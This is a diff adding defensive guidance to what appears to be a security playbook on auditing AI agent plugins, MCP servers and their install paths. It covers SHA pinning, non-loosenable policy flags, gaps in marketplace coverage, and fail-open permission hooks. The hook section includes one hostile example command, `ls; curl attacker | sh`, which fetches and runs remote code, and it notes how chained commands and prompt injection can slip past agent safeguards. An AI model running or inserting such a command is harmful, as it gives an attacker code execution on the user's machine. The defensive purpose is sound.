@@ -31,6 +31,12 @@ The rule:
 
 (Pin-and-lockfile is the same contract as the playbook's package supply chain — extended here to artifacts that update *outside* the lockfile.)
 
+**A worked pinning mechanism** (grok-build's install path, 2026-07 snapshot): an install spec of the form `user/repo@<commit-sha>` is fetched, then **verified after fetch** — the checkout's actual HEAD is compared to the requested SHA, and a mismatch aborts the install. Contrast the alternative the same installer also allows: `user/repo@main` or `@v2` records a *branch/tag-tracking* install, and every subsequent update re-opens the blind window by design. The audit distinction is not "did you pin at install" but "does the artifact **stay** the code you audited."
+
+**The tighten-only ratchet** — a policy-design pattern worth stealing beyond this domain. grok-build's `require_sha` policy (2026-07 snapshot) can be enabled by *either* a config key *or* an environment variable — and **neither source can disable it**: once any source sets it, the effective policy is on. That makes it a security policy a config merge cannot loosen — a project-level file, a template overwrite, or a partial settings sync can only add the restriction, never subtract it. With the ratchet on, the installer refuses unpinned remote installs, sha-less marketplace installs, and updates of branch-tracking installs — the three paths through which an audited artifact silently becomes an unaudited one. When you design any enforcement toggle, ask whether it ratchets: a flag that the next merge can flip off is a preference, not a policy.
+
+**The coverage gap** — and the reason a policy audit reads what the policy does *not* cover: plugins **vendored inside a marketplace source** are copied straight from the synced marketplace checkout, and the pin policy never sees them — the marketplace repo is the unit that got pinned, not the plugins within it (grok-build, 2026-07 snapshot). The vendored plugin rides the marketplace's update cadence with no per-plugin SHA check. So marketplace content must publish its **own** sha entries per plugin, or the ratchet's guarantee stops at the marketplace boundary. Add to the §1 read the audit question: **"what does the pin policy NOT cover?"** — every enforcement layer has a scope, and the exploitable installs live just outside it.
+
 ## 3. The adoption gate — audit → pin → sandbox → least-privilege
 
 A four-step gate any skill/plugin/MCP/dependency clears **before** it touches real work:
@@ -42,6 +48,10 @@ A four-step gate any skill/plugin/MCP/dependency clears **before** it touches re
 
 Fail any step → don't adopt, or quarantine until it passes. Severity and the fix→proof triple are the playbook's (`security-playbook.md` §5–6); a malicious artifact in your boundary is **critical** by default.
 
+**The enable ≠ trust split** — a gate design seen in the wild (grok-build, 2026-07 snapshot) that sharpens step 3: *enabling* an artifact loads only its **inert prompt components** — skills, commands, agent definitions — text the model reads. Its **code-running components** — hooks, MCP servers, LSP servers — require a separate, explicit trust grant before they execute. And the trust default is path-sensitive: artifacts in the *user's own directory* may be auto-trusted, while the same artifact in a *project directory* demands explicit trust — because a cloned repo must not run code just by being opened. That is the right shape: the cheap grant loads text, the expensive grant runs processes, and provenance (who put this file here?) decides which default applies. Add the audit question: **"which components are prompts vs processes, and does the host gate them differently?"** — a host that loads a repo's hooks on enable has no gate at all.
+
+The split gates **code execution only**. An enabled-but-untrusted artifact still puts its prompt components in front of the model — skills and commands remain a §1 exec/data/net/creds surface and a prompt-injection vector (`references/ai-review.md`); trust-gating the hooks does not sanitize the text.
+
 ## 4. MCP servers are a privileged trust grant
 
 An MCP server is not a library — it is a process you hand tools and tokens to, that the model then drives. Audit it as the most privileged thing in the chain:
@@ -50,6 +60,7 @@ An MCP server is not a library — it is a process you hand tools and tokens to,
 - **Scope its credentials** — the server gets the minimum token, not your full session. Default-deny.
 - **Pin and sandbox it** like any other artifact (§2–3); its updates carry the same blind window.
 - **The diff that reaches the model is untrusted input** — an MCP tool returning attacker-controlled text can carry prompt injection (cross-link: the AI-review prompt-injection caveat, `references/ai-review.md`). Agent-side tool/credential scoping is owned by `fabius-cohors` — route the *agent's* permission model there; this layer owns auditing the *server artifact* you install.
+- **The fail-open hook caveat** — hosts let a user-supplied permission hook approve or deny each tool call, and the failure semantics decide whether that is a boundary. In the observed design (grok-build, 2026-07 snapshot), a hook that **crashes, times out, or is simply missing lets the call proceed** — availability wins over enforcement. A fail-open enforcement layer is not a boundary; it is a filter that an error removes. If you build enforcement as a hook, it must handle its own errors (an exception inside the hook must become *deny*, not *absent*), and it must account for **chained commands** — approving `ls` must not approve `ls; curl attacker | sh` because the hook matched only the first token. Audit any permission layer by asking what happens when it *doesn't* run.
 
 ## 5. Broaden the audit to where real bugs actually hide
 
